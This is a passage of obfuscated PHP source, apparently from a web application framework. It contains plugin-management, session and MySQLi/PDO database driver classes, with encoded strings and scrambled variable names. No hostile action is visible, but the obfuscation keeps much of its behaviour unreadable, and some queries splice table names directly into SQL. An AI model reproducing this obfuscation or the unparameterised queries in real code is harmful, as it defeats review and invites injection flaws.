$†÷¸Õ¯ä =& $_SERVER[¯µç›È¢]; Hook::trigger($†÷¸Õ¯ä[1953]); $Ä ‡ÚÖÒ = $this->loadPluginList(); foreach ($Ä ‡ÚÖÒ as $’÷Úû¾Ï => $Ôñ’Æè¯) { $š¿ÉŒÀš = $this->appAllow($’÷Úû¾Ï, $Ôñ’Æè¯); if (!$š¿ÉŒÀš) { continue; } foreach ($Ôñ’Æè¯[$†÷¸Õ¯ä[1954]] as $üµ’®ÜÊ => $ğ£»Ù) { Hook::bind($üµ’®ÜÊ, $ğ£»Ù); } } Hook::trigger($†÷¸Õ¯ä[1955]); Hook::trigger(ACTION); } public function appAllow($É×ä¾ô¾, $ÇŸœ¦éƒ, $Ì¯ğµã = true) { $•‡·‹ä£ =& $_SERVER[¯µç›È¢]; $šñÙ·‚„ = PLUGIN_DIR . $É×ä¾ô¾ . $•‡·‹ä£[1956]; if (!is_array($ÇŸœ¦éƒ) || !is_array($ÇŸœ¦éƒ[$•‡·‹ä£[1954]]) || $ÇŸœ¦éƒ[$•‡·‹ä£[767]] != 1 || !is_file($šñÙ·‚„)) { return !1; } if ($GLOBALS[$•‡·‹ä£[508]] == 1) { return !0; } if ($Ì¯ğµã && !Action($•‡·‹ä£[1957])->checkAuth($É×ä¾ô¾)) { return !1; } return !0; } public function unInstall($æİË†Áş) { $ÆÁâ©Ş =& $_SERVER[¯µç›È¢]; $‰¹âÕîĞ = $this->loadList($æİË†Áş); if (file_exists(PLUGIN_DIR . $æİË†Áş)) { Hook::apply($æİË†Áş . $ÆÁâ©Ş[1958]); } $this->remove($‰¹âÕîĞ[$ÆÁâ©Ş[405]]); } public function changeStatus($ÑÛ€’ËÖ, $ƒ¨´úÚ—) { $ğ’ôÕ½é =& $_SERVER[¯µç›È¢]; $¸£· “ = $this->loadList($ÑÛ€’ËÖ); if ($ƒ¨´úÚ—) { Hook::apply($ÑÛ€’ËÖ . $ğ’ôÕ½é[1959]); } $this->update($¸£· “[$ğ’ôÕ½é[405]], array($ğ’ôÕ½é[1960] => $ƒ¨´úÚ—)); } public function appRegist($ÃüÈÜ„¡, $æµÌŒÈø) { $Æºí–ºã =& $_SERVER[¯µç›È¢]; $ÙóŸåÆ‡ = $this->loadList($ÃüÈÜ„¡); if ($ÙóŸåÆ‡) { $this->update($ÙóŸåÆ‡[$Æºí–ºã[405]], array($Æºí–ºã[1954] => $æµÌŒÈø)); } else { $öèŠ±ï = array($Æºí–ºã[32] => $ÃüÈÜ„¡, $Æºí–ºã[1954] => $æµÌŒÈø, $Æºí–ºã[767] => 0, $Æºí–ºã[6] => $this->getConfigDefault($ÃüÈÜ„¡)); $this->insert($öèŠ±ï); } } public function getConfigDefault($»‹”©î) { $ôÆ·İÜ× =& $_SERVER[¯µç›È¢]; $Ïª¦†’ = array(); $´¬»ä“Ö = $this->getPackageJson($»‹”©î); if (!$´¬»ä“Ö && is_array($´¬»ä“Ö[$ôÆ·İÜ×[1961]])) { return $Ïª¦†’; } foreach ($´¬»ä“Ö[$ôÆ·İÜ×[1961]] as $‘™ƒü¬ => $¼ìÍ®Ÿ) { if (!isset($¼ìÍ®Ÿ[$ôÆ·İÜ×[382]]) || isset($Ïª¦†’[$‘™ƒü¬])) { continue; } $Ïª¦†’[$‘™ƒü¬] = $¼ìÍ®Ÿ[$ôÆ·İÜ×[382]]; } return $Ïª¦†’; } public function getPackageJson($ŞâíÁ÷Â) { return Hook::apply($ŞâíÁ÷Â . $_SERVER[¯µç›È¢][1962]); } public function getConfig($¨Ê‚×§õ, $ÃÊÁã›É = false) { $„Í‡ìú™ =& $_SERVER[¯µç›È¢]; $ã›ù± = array(); $§¸•­ = $this->loadList($¨Ê‚×§õ); if ($§¸•­ && is_array($§¸•­[$„Í‡ìú™[6]])) { $ã›ù± = $§¸•­[$„Í‡ìú™[6]]; } if (!$ã›ù± || $ÃÊÁã›É) { $ã›ù± = $this->getConfigDefault($¨Ê‚×§õ); } return $ã›ù±; } public function setConfig($Ù‘°È€Ÿ, $ŒÚ¯ŸÇ¶ = false) { $¦£˜  =& $_SERVER[¯µç›È¢]; $ØâßÔˆ = $this->loadList($Ù‘°È€Ÿ); if (!$ØâßÔˆ) { return !1; } $ÉÆ”Ûñì = $ØâßÔˆ[$¦£˜ [6]]; if ($ŒÚ¯ŸÇ¶ == !1) { $ÉÆ”Ûñì = array(); $ŒÚ¯ŸÇ¶ = $this->getConfigDefault($Ù‘°È€Ÿ); } foreach ($ŒÚ¯ŸÇ¶ as $„–¾Ú => $Ô ïÍÎ÷) { $ÉÆ”Ûñì[$„–¾Ú] = is_string($Ô ïÍÎ÷) ? trim($Ô ïÍÎ÷) : $Ô ïÍÎ÷; } $this->update($ØâßÔˆ[$¦£˜ [405]], array($¦£˜ [6] => $ÉÆ”Ûñì)); } public function viewList() { $×ÃÜ±©Ğ =& $_SERVER[¯µç›È¢]; $‹­¼ğòæ = $this->loadList(); $this->pluginScan($‹­¼ğòæ); $‹­¼ğòæ = $this->loadPluginList(); $è›¿İš¡ = array(); foreach ($‹­¼ğòæ as $‚·ˆóÉá => $Å¼ŠÛÄ) { unset($Å¼ŠÛÄ[$×ÃÜ±©Ğ[1954]], $Å¼ŠÛÄ[$×ÃÜ±©Ğ[6]]); $Œ‚°ğ³Ğ = PLUGIN_DIR . $Å¼ŠÛÄ[$×ÃÜ±©Ğ[32]] . $×ÃÜ±©Ğ[1956]; if (!is_file($Œ‚°ğ³Ğ)) { continue; } $Ùı×Ïú = Hook::apply($Å¼ŠÛÄ[$×ÃÜ±©Ğ[32]] . $×ÃÜ±©Ğ[1962]); if (is_array($Ùı×Ïú)) { $è›¿İš¡[$‚·ˆóÉá] = array_merge($Å¼ŠÛÄ, $Ùı×Ïú); } } return $è›¿İš¡; } private function loadPluginList() { $€ı¾´š =& $_SERVER[¯µç›È¢]; $Ò«áƒ­“ = $this->loadList(); if (strtolower(MOD) == $€ı¾´š[1963]) { return $Ò«áƒ­“; } $‰•ò†³ = Hook::trigger($€ı¾´š[1964], $Ò«áƒ­“); if ($Ò«áƒ­“ && !$‰•ò†³) { die; } return $‰•ò†³ ? $‰•ò†³ : $Ò«áƒ­“; } private function pluginScan($ƒÅ³í©ì) { $…££åš =& $_SERVER[¯µç›È¢]; recursion_dir(PLUGIN_DIR, $ı†éÛ÷Õ, $âÒÄæíÉ, 0); foreach ($ı†éÛ÷Õ as $„”ƒÓæú) { $óÈş€—• = get_path_this($„”ƒÓæú); if (isset($ƒÅ³í©ì[$óÈş€—•]) || !file_exists($„”ƒÓæú . $…££åš[1965]) || !file_exists($„”ƒÓæú . $…££åš[1956])) { continue; } Hook::apply($óÈş€—• . $…££åš[1959]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\137\x73\145\x73\163\151\x6f\x6e"; public function get($÷äëùº) { $ç½ÑÛçø =& $_SERVER[¯µç›È¢]; $å„Æ£¨ = $this->where(array($ç½ÑÛçø[1966] => $÷äëùº))->find(); if (!is_array($å„Æ£¨)) { return !1; } return $å„Æ£¨[$ç½ÑÛçø[772]]; } public function set($âÂé€Â, $ÅØ´Ù¿, $–æ¢š‚æ = 3600) { $±‘˜Ë­¼ =& $_SERVER[¯µç›È¢]; $º…¼×€™ = array($±‘˜Ë­¼[1966] => $âÂé€Â, $±‘˜Ë­¼[1872] => $ÅØ´Ù¿, $±‘˜Ë­¼[1967] => $–æ¢š‚æ + time()); if (Session::get($±‘˜Ë­¼[1968])) { $º…¼×€™[$±‘˜Ë­¼[1666]] = Session::get($±‘˜Ë­¼[1968]); } else { $º…¼×€™[$±‘˜Ë­¼[1666]] = 0; } if ($this->get($âÂé€Â)) { return $this->where(array($±‘˜Ë­¼[1966] => $âÂé€Â))->save($º…¼×€™); } else { return $this->add($º…¼×€™, array(), !0); } } public function remove($óåûÛşÅ) { return $this->where(array($_SERVER[¯µç›È¢][1966] => $óåûÛşÅ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¯µç›È¢][1969] . time())->delete(); } } goto fº®¹ŒÓ†å; Fßë¬ì£ŸÆ: class DbMysqli extends Db { public function __construct($¶–Ù© = '') { $íßÓ‡Ó¯ =& $_SERVER[¯µç›È¢]; if (!extension_loaded($íßÓ‡Ó¯[924])) { think_exception(think_lang($íßÓ‡Ó¯[14]) . $íßÓ‡Ó¯[925]); } if (!empty($¶–Ù©)) { $this->config = $¶–Ù©; if (empty($this->config[$íßÓ‡Ó¯[17]])) { $this->config[$íßÓ‡Ó¯[17]] = $íßÓ‡Ó¯[12]; } } } public function connect($¹‡ğ¼§ = '', $Øìª«Şı = 0) { $¡Â·Øøá =& $_SERVER[¯µç›È¢]; if (!isset($this->linkID[$Øìª«Şı])) { if (empty($¹‡ğ¼§)) { $¹‡ğ¼§ = $this->config; } $this->linkID[$Øìª«Şı] = new mysqli($¹‡ğ¼§[$¡Â·Øøá[898]], $¹‡ğ¼§[$¡Â·Øøá[900]], $¹‡ğ¼§[$¡Â·Øøá[901]], $¹‡ğ¼§[$¡Â·Øøá[21]], $¹‡ğ¼§[$¡Â·Øøá[899]] ? intval($¹‡ğ¼§[$¡Â·Øøá[899]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ä¡Öóı‰ = $this->linkID[$Øìª«Şı]->server_version; $this->linkID[$Øìª«Şı]->query($¡Â·Øøá[902] . think_config($¡Â·Øøá[903]) . $¡Â·Øøá[58]); if ($Ä¡Öóı‰ > $¡Â·Øøá[904]) { $this->linkID[$Øìª«Şı]->query($¡Â·Øøá[905]); } $this->connected = !0; if (1 != think_config($¡Â·Øøá[22])) { unset($this->config); } } return $this->linkID[$Øìª«Şı]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($±Ÿı£¼°) { $»³¸ëŞë =& $_SERVER[¯µç›È¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±Ÿı£¼°; if ($this->queryID) { $this->free(); } think_action_status($»³¸ëŞë[23], 1); think_status($»³¸ëŞë[24]); $this->queryID = $this->_linkID->query($±Ÿı£¼°); if ($this->_linkID->more_results()) { while (($åÑØš§¿ = $this->_linkID->next_result()) != NULL) { $åÑØš§¿->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¨–ü¿Ò†) { $¦à¤š¸Â =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨–ü¿Ò†; if ($this->queryID) { $this->free(); } think_action_status($¦à¤š¸Â[25], 1); think_status($¦à¤š¸Â[24]); $¼¼éØºˆ = $this->_linkID->query($¨–ü¿Ò†); $this->debug(); if (!1 === $¼¼éØºˆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚—÷Åî = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‚—÷Åî) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆÓÙíĞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ˆÓÙíĞ) { $this->error(); return !1; } } return !0; } private function getAll() { $öŸ½ß“á = array(); if ($this->numRows > 0) { for ($¬¸§ÅÕû = 0; $¬¸§ÅÕû < $this->numRows; $¬¸§ÅÕû++) { $öŸ½ß“á[$¬¸§ÅÕû] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $öŸ½ß“á; } public function getFields($¿í ß š) { $À²óÏ‘Ù =& $_SERVER[¯µç›È¢]; $½ş®ˆÚ¢ = $this->query($À²óÏ‘Ù[909] . $this->parseKey($¿í ß š)); $·ôš€ÆÖ = array(); if ($½ş®ˆÚ¢) { foreach ($½ş®ˆÚ¢ as $Ïò¦üÑ => $›õÔ½¿“) { $·ôš€ÆÖ[$›õÔ½¿“[$À²óÏ‘Ù[31]]] = array($À²óÏ‘Ù[32] => $›õÔ½¿“[$À²óÏ‘Ù[31]], $À²óÏ‘Ù[33] => $›õÔ½¿“[$À²óÏ‘Ù[34]], $À²óÏ‘Ù[35] => (bool) ($›õÔ½¿“[$À²óÏ‘Ù[36]] === $À²óÏ‘Ù[12]), $À²óÏ‘Ù[37] => $›õÔ½¿“[$À²óÏ‘Ù[38]], $À²óÏ‘Ù[39] => strtolower($›õÔ½¿“[$À²óÏ‘Ù[40]]) == $À²óÏ‘Ù[41], $À²óÏ‘Ù[42] => strtolower($›õÔ½¿“[$À²óÏ‘Ù[43]]) == $À²óÏ‘Ù[44]); } } return $·ôš€ÆÖ; } public function getTables($Á¸‹Õßí = '') { $şÓ’”èé =& $_SERVER[¯µç›È¢]; $İºò— = !empty($Á¸‹Õßí) ? $şÓ’”èé[911] . $Á¸‹Õßí . $şÓ’”èé[912] : $şÓ’”èé[913]; $îÓ·ÜØø = $this->query($İºò—); $–ÉœüšÙ = array(); if ($îÓ·ÜØø) { foreach ($îÓ·ÜØø as $¹œìƒ”™ => $‘†Á­É™) { $–ÉœüšÙ[$¹œìƒ”™] = current($‘†Á­É™); } } return $–ÉœüšÙ; } public function replace($åÂƒÖ±, $¹¢öÂø£ = array()) { $ÆÁÍËœ =& $_SERVER[¯µç›È¢]; foreach ($åÂƒÖ± as $Ñ´¾ÓÈ => $µô€é¦) { $„À®ÍĞ = $this->parseValue($µô€é¦); if (is_scalar($„À®ÍĞ)) { $º•¢±¨Ù[] = $„À®ÍĞ; $¦³šß²ş[] = $this->parseKey($Ñ´¾ÓÈ); } } $É—»ºúÓ = $ÆÁÍËœ[914] . $this->parseTable($¹¢öÂø£[$ÆÁÍËœ[287]]) . $ÆÁÍËœ[915] . implode($ÆÁÍËœ[50], $¦³šß²ş) . $ÆÁÍËœ[916] . implode($ÆÁÍËœ[50], $º•¢±¨Ù) . $ÆÁÍËœ[917]; return $this->execute($É—»ºúÓ); } public function insertAll($óÉª¶ÇÚ, $ñóğ—ÌÒ = array(), $å¸Óõ‰İ = false) { $ˆüÌûÒ„ =& $_SERVER[¯µç›È¢]; if (!is_array($óÉª¶ÇÚ[0])) { return !1; } $Ó’ìùó… = array_keys($óÉª¶ÇÚ[0]); $‚‡¢­© = array(); foreach ($óÉª¶ÇÚ as $ìîéé«”) { $¤ñ‘ÃŠ˜ = array(); foreach ($ìîéé«” as $¼‹ü© => $Ùİ£„îî) { $Ùİ£„îî = $this->parseValue($Ùİ£„îî); if (is_scalar($Ùİ£„îî)) { $¤ñ‘ÃŠ˜[] = $Ùİ£„îî; } } $‚‡¢­©[] = $ˆüÌûÒ„[268] . implode($ˆüÌûÒ„[50], $¤ñ‘ÃŠ˜) . $ˆüÌûÒ„[917]; } array_walk($Ó’ìùó…, array($this, $ˆüÌûÒ„[918])); $¡¾ËÇ‹û = $å¸Óõ‰İ ? $ˆüÌûÒ„[919] : $ˆüÌûÒ„[920]; $–ù‹ıïü = $¡¾ËÇ‹û . $ˆüÌûÒ„[921] . $this->parseTable($ñóğ—ÌÒ[$ˆüÌûÒ„[287]]) . $ˆüÌûÒ„[915] . implode($ˆüÌûÒ„[50], $Ó’ìùó…) . $ˆüÌûÒ„[922] . implode($ˆüÌûÒ„[50], $‚‡¢­©); return $this->execute($–ù‹ıïü); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $©÷ÃÎ©² =& $_SERVER[¯µç›È¢]; $this->error = $this->_linkID->errno . $©÷ÃÎ©²[4] . $this->_linkID->error; if ($©÷ÃÎ©²[12] != $this->queryStr) { $this->error .= LNG($©÷ÃÎ©²[48]) . $this->queryStr; } think_trace($this->error, $©÷ÃÎ©²[12], $©÷ÃÎ©²[49]); return $this->error; } public function escapeString($ìíõú‡¼) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ìíõú‡¼); } else { return addslashes($ìíõú‡¼); } } public function parseKey(&$¯š¬éª‹, $Ã¡´«Š = true) { $Şóò¼¾ =& $_SERVER[¯µç›È¢]; if ($Ã¡´«Š) { $¯š¬éª‹ = $this->parseKeyCheck($¯š¬éª‹); } if ($¯š¬éª‹ != $Şóò¼¾[195] && !preg_match($Şóò¼¾[923], $¯š¬éª‹)) { $¯š¬éª‹ = $Şóò¼¾[393] . trim($¯š¬éª‹, $Şóò¼¾[393]) . $Şóò¼¾[393]; } return $¯š¬éª‹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($§’ ‚… = '') { $åÄé¥ì¤ =& $_SERVER[¯µç›È¢]; if (!class_exists($åÄé¥ì¤[926])) { think_exception(think_lang($åÄé¥ì¤[14]) . $åÄé¥ì¤[927]); } if (!empty($§’ ‚…)) { $this->config = $§’ ‚…; if (empty($this->config[$åÄé¥ì¤[17]])) { $this->config[$åÄé¥ì¤[17]] = array(); } } } public function connect($–×œ‚ô = '', $æ‹ıÚˆ = 0) { $¥‹ı§÷» =& $_SERVER[¯µç›È¢]; if (!isset($this->linkID[$æ‹ıÚˆ])) { if (empty($–×œ‚ô)) { $–×œ‚ô = $this->config; } $›‚‚İŞË = !empty($–×œ‚ô[$¥‹ı§÷»[17]][$¥‹ı§÷»[18]]) ? $–×œ‚ô[$¥‹ı§÷»[17]][$¥‹ı§÷»[18]] : $this->pconnect; if ($›‚‚İŞË) { $–×œ‚ô[$¥‹ı§÷»[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$æ‹ıÚˆ] = new PDO($–×œ‚ô[$¥‹ı§÷»[928]], $–×œ‚ô[$¥‹ı§÷»[900]], $–×œ‚ô[$¥‹ı§÷»[901]], $–×œ‚ô[$¥‹ı§÷»[17]]); } catch (PDOException $ëÔ¨ƒÇî) { think_exception($ëÔ¨ƒÇî->getMessage()); } $this->dbType = $this->_getDsnType($–×œ‚ô[$¥‹ı§÷»[928]]); if (in_array($this->dbType, array($¥‹ı§÷»[929], $¥‹ı§÷»[930], $¥‹ı§÷»[931], $¥‹ı§÷»[932]))) { think_exception($¥‹ı§÷»[933] . $this->dbType . $¥‹ı§÷»[934] . $this->dbType . $¥‹ı§÷»[935]); } if (!$this->linkID[$æ‹ıÚˆ]) { think_exception($¥‹ı§÷»[936]); } try { $this->linkID[$æ‹ıÚˆ]->exec($¥‹ı§÷»[937] . think_config($¥‹ı§÷»[903])); } catch (Exception $ëÔ¨ƒÇî) { } $this->connected = !0; if (1 != think_config($¥‹ı§÷»[22])) { unset($this->config); } } return $this->linkID[$æ‹ıÚˆ]; } public function free() { $this->PDOStatement = null; } public function query($ã—ºœ¶, $á¦‘¨Òæ = array()) { $ƒ€Ø¿Î =& $_SERVER[¯µç›È¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã—ºœ¶; if (!empty($á¦‘¨Òæ)) { $this->queryStr .= $ƒ€Ø¿Î[938] . print_r($á¦‘¨Òæ, !0) . $ƒ€Ø¿Î[939]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ƒ€Ø¿Î[23], 1); think_status($ƒ€Ø¿Î[24]); $this->PDOStatement = $this->_linkID->prepare($ã—ºœ¶); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¹ßú“Ù½ = $this->PDOStatement->execute($á¦‘¨Òæ); $this->debug(); if (!1 === $¹ßú“Ù½) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ª‚­ŠÚÑ, $¯Òæ——Ó = array()) { $ô÷‡‡Ó =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª‚­ŠÚÑ; if (!empty($¯Òæ——Ó)) { $this->queryStr .= $ô÷‡‡Ó[938] . print_r($¯Òæ——Ó, !0) . $ô÷‡‡Ó[939]; } $›ƒş»—÷ = !1; if ($this->dbType == $ô÷‡‡Ó[932]) { if (preg_match($ô÷‡‡Ó[940], $this->queryStr, $áôí‹Ò¬)) { $this->table = think_config($ô÷‡‡Ó[941]) . str_ireplace(think_config($ô÷‡‡Ó[942]), $ô÷‡‡Ó[386], $áôí‹Ò¬[2]); $›ƒş»—÷ = (bool) $this->query($ô÷‡‡Ó[943] . strtoupper($this->table) . $ô÷‡‡Ó[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ô÷‡‡Ó[25], 1); think_status($ô÷‡‡Ó[24]); $this->PDOStatement = $this->_linkID->prepare($ª‚­ŠÚÑ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Â·Ş­ìß = $this->PDOStatement->execute($¯Òæ——Ó); $this->debug(); if (!1 === $Â·Ş­ìß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($›ƒş»—÷ || preg_match($ô÷‡‡Ó[944], $ª‚­ŠÚÑ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $í¹Ñíì˜ = $this->_linkID->commit(); $this->transTimes = 0; if (!$í¹Ñíì˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µè£§ŒÕ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µè£§ŒÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $¯´Î›ßÙ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¯´Î›ßÙ); return $¯´Î›ßÙ; } public function getFields($ù˜ÏÇ™¸) { $°ªù¾ÏÙ =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (think_config($°ªù¾ÏÙ[945])) { $¨Î±î™Â = str_replace($°ªù¾ÏÙ[946], $ù˜ÏÇ™¸, think_config($°ªù¾ÏÙ[945])); } else { switch ($this->dbType) { case $°ªù¾ÏÙ[929]: case $°ªù¾ÏÙ[947]: $¨Î±î™Â = "\123\105\x4c\105\103\124\x20\x20\40\x63\x6f\x6c\165\155\x6e\137\x6e\x61\x6d\145\x20\141\x73\x20\x27\x4e\141\155\x65\47\54\x20\40\40\144\x61\164\141\137\x74\171\160\145\40\141\x73\40\x27\124\171\160\x65\x27\x2c\x20\40\x20\x63\x6f\154\165\x6d\x6e\x5f\x64\x65\146\141\165\x6c\x74\40\x61\x73\x20\47\104\x65\146\x61\x75\x6c\164\47\x2c\40\x20\40\x69\163\x5f\x6e\165\154\154\141\142\x6c\145\x20\x61\163\x20\x27\x4e\165\x6c\x6c\x27\xa\x9\x9\x46\x52\117\115\11\x69\x6e\x66\x6f\x72\x6d\x61\164\x69\x6f\156\137\163\x63\150\145\x6d\141\x2e\x74\x61\x62\x6c\145\x73\x20\x41\x53\40\x74\xa\11\x9\112\x4f\111\116\11\151\156\x66\157\162\x6d\141\164\151\x6f\x6e\137\x73\x63\150\145\155\141\x2e\x63\x6f\x6c\165\155\x6e\x73\x20\101\123\x20\x63\12\x9\x9\117\x4e\x20\x20\164\56\164\x61\142\x6c\145\x5f\143\141\164\x61\154\x6f\147\40\75\x20\x63\56\x74\141\x62\154\x65\x5f\143\x61\x74\x61\154\157\x67\12\11\11\101\x4e\104\40\x74\56\x74\x61\x62\154\x65\x5f\163\143\x68\145\155\141\x20\x3d\x20\x63\x2e\x74\141\x62\x6c\x65\137\x73\143\x68\145\x6d\x61\xa\x9\x9\x41\x4e\104\x20\164\56\x74\x61\142\x6c\x65\x5f\x6e\x61\x6d\x65\x20\75\x20\143\x2e\x74\141\x62\x6c\x65\x5f\156\x61\155\145\12\x9\11\x57\x48\105\x52\105\40\x20\40\164\x2e\x74\141\142\154\145\137\x6e\x61\155\145\40\x3d\40\47{$ù˜ÏÇ™¸}\47"; break; case $°ªù¾ÏÙ[948]: $¨Î±î™Â = $°ªù¾ÏÙ[949] . $ù˜ÏÇ™¸ . $°ªù¾ÏÙ[950]; break; case $°ªù¾ÏÙ[930]: case $°ªù¾ÏÙ[932]: $¨Î±î™Â = $°ªù¾ÏÙ[951] . $°ªù¾ÏÙ[952] . $°ªù¾ÏÙ[953] . strtoupper($ù˜ÏÇ™¸) . $°ªù¾ÏÙ[954] . strtoupper($ù˜ÏÇ™¸) . $°ªù¾ÏÙ[955]; break; case $°ªù¾ÏÙ[956]: $¨Î±î™Â = $°ªù¾ÏÙ[957] . $ù˜ÏÇ™¸ . $°ªù¾ÏÙ[958]; break; case $°ªù¾ÏÙ[931]: break; case $°ªù¾ÏÙ[959]: default: $¨Î±î™Â = $°ªù¾ÏÙ[960] . ($this->dbType == $°ªù¾ÏÙ[959] ? "\x60{$ù˜ÏÇ™¸}\x60" : $ù˜ÏÇ™¸); } } $¹íëï• = $this->query($¨Î±î™Â); $ÎÛç×Ø½ = array(); if ($¹íëï•) { foreach ($¹íëï• as $…Ó•Ìä => $È¨™ÂÏ’) { $È¨™ÂÏ’ = array_change_key_case($È¨™ÂÏ’); $È¨™ÂÏ’[$°ªù¾ÏÙ[32]] = isset($È¨™ÂÏ’[$°ªù¾ÏÙ[32]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[32]] : $°ªù¾ÏÙ[386]; $È¨™ÂÏ’[$°ªù¾ÏÙ[33]] = isset($È¨™ÂÏ’[$°ªù¾ÏÙ[33]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[33]] : $°ªù¾ÏÙ[386]; $È¾Ÿ¶ò = isset($È¨™ÂÏ’[$°ªù¾ÏÙ[281]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[281]] : $È¨™ÂÏ’[$°ªù¾ÏÙ[32]]; $ÎÛç×Ø½[$È¾Ÿ¶ò] = array($°ªù¾ÏÙ[32] => $È¾Ÿ¶ò, $°ªù¾ÏÙ[33] => $È¨™ÂÏ’[$°ªù¾ÏÙ[33]], $°ªù¾ÏÙ[35] => (bool) (isset($È¨™ÂÏ’[$°ªù¾ÏÙ[114]]) && $È¨™ÂÏ’[$°ªù¾ÏÙ[114]] === $°ªù¾ÏÙ[12] || isset($È¨™ÂÏ’[$°ªù¾ÏÙ[35]]) && $È¨™ÂÏ’[$°ªù¾ÏÙ[35]] === $°ªù¾ÏÙ[12]), $°ªù¾ÏÙ[37] => isset($È¨™ÂÏ’[$°ªù¾ÏÙ[37]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[37]] : (isset($È¨™ÂÏ’[$°ªù¾ÏÙ[56]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[56]] : $°ªù¾ÏÙ[386]), $°ªù¾ÏÙ[39] => isset($È¨™ÂÏ’[$°ªù¾ÏÙ[105]]) ? strtolower($È¨™ÂÏ’[$°ªù¾ÏÙ[105]]) == $°ªù¾ÏÙ[41] : (isset($È¨™ÂÏ’[$°ªù¾ÏÙ[57]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[57]] : !1), $°ªù¾ÏÙ[42] => isset($È¨™ÂÏ’[$°ªù¾ÏÙ[961]]) ? strtolower($È¨™ÂÏ’[$°ªù¾ÏÙ[961]]) == $°ªù¾ÏÙ[44] : (isset($È¨™ÂÏ’[$°ªù¾ÏÙ[105]]) ? $È¨™ÂÏ’[$°ªù¾ÏÙ[105]] : !1)); } } return $ÎÛç×Ø½; } public function getTables($®áÄ¸ğ = '') { $³—ë­‡Á =& $_SERVER[¯µç›È¢]; if (think_config($³—ë­‡Á[962])) { $æŒ‚Ù¹à = str_replace($³—ë­‡Á[963], $®áÄ¸ğ, think_config($³—ë­‡Á[962])); } else { switch ($this->dbType) { case $³—ë­‡Á[930]: case $³—ë­‡Á[932]: $æŒ‚Ù¹à = $³—ë­‡Á[964]; break; case $³—ë­‡Á[929]: case $³—ë­‡Á[947]: $æŒ‚Ù¹à = $³—ë­‡Á[965]; break; case $³—ë­‡Á[956]: $æŒ‚Ù¹à = $³—ë­‡Á[966]; break; case $³—ë­‡Á[931]: think_exception(think_lang($³—ë­‡Á[967]) . $³—ë­‡Á[968]); break; case $³—ë­‡Á[948]: $æŒ‚Ù¹à = $³—ë­‡Á[45] . $³—ë­‡Á[46] . $³—ë­‡Á[47]; break; case $³—ë­‡Á[959]: default: if (!empty($®áÄ¸ğ)) { $æŒ‚Ù¹à = $³—ë­‡Á[911] . $®áÄ¸ğ . $³—ë­‡Á[912]; } else { $æŒ‚Ù¹à = $³—ë­‡Á[913]; } } } $‹ş’ú¿ = $this->query($æŒ‚Ù¹à); $¼„ìÓÍ = array(); foreach ($‹ş’ú¿ as $ş‹‰Õˆ => $éóÔ¹éª) { $¼„ìÓÍ[$ş‹‰Õˆ] = current($éóÔ¹éª); } return $¼„ìÓÍ; } protected function parseLimit($ü§ïíº¡) { $¬èõÇÓ =& $_SERVER[¯µç›È¢]; $ãûÇõ» = $¬èõÇÓ[12]; if (!empty($ü§ïíº¡)) { switch ($this->dbType) { case $¬èõÇÓ[956]: case $¬èõÇÓ[948]: $ü§ïíº¡ = explode($¬èõÇÓ[50], $ü§ïíº¡); if (count($ü§ïíº¡) > 1) { $ãûÇõ» .= $¬èõÇÓ[51] . $ü§ïíº¡[1] . $¬èõÇÓ[52] . $ü§ïíº¡[0] . $¬èõÇÓ[53]; } else { $ãûÇõ» .= $¬èõÇÓ[51] . $ü§ïíº¡[0] . $¬èõÇÓ[53]; } break; case $¬èõÇÓ[929]: case $¬èõÇÓ[947]: break; case $¬èõÇÓ[931]: break; case $¬èõÇÓ[930]: case $¬èõÇÓ[932]: break; case $¬èõÇÓ[959]: default: $ãûÇõ» .= $¬èõÇÓ[51] . $ü§ïíº¡ . $¬èõÇÓ[53]; } } 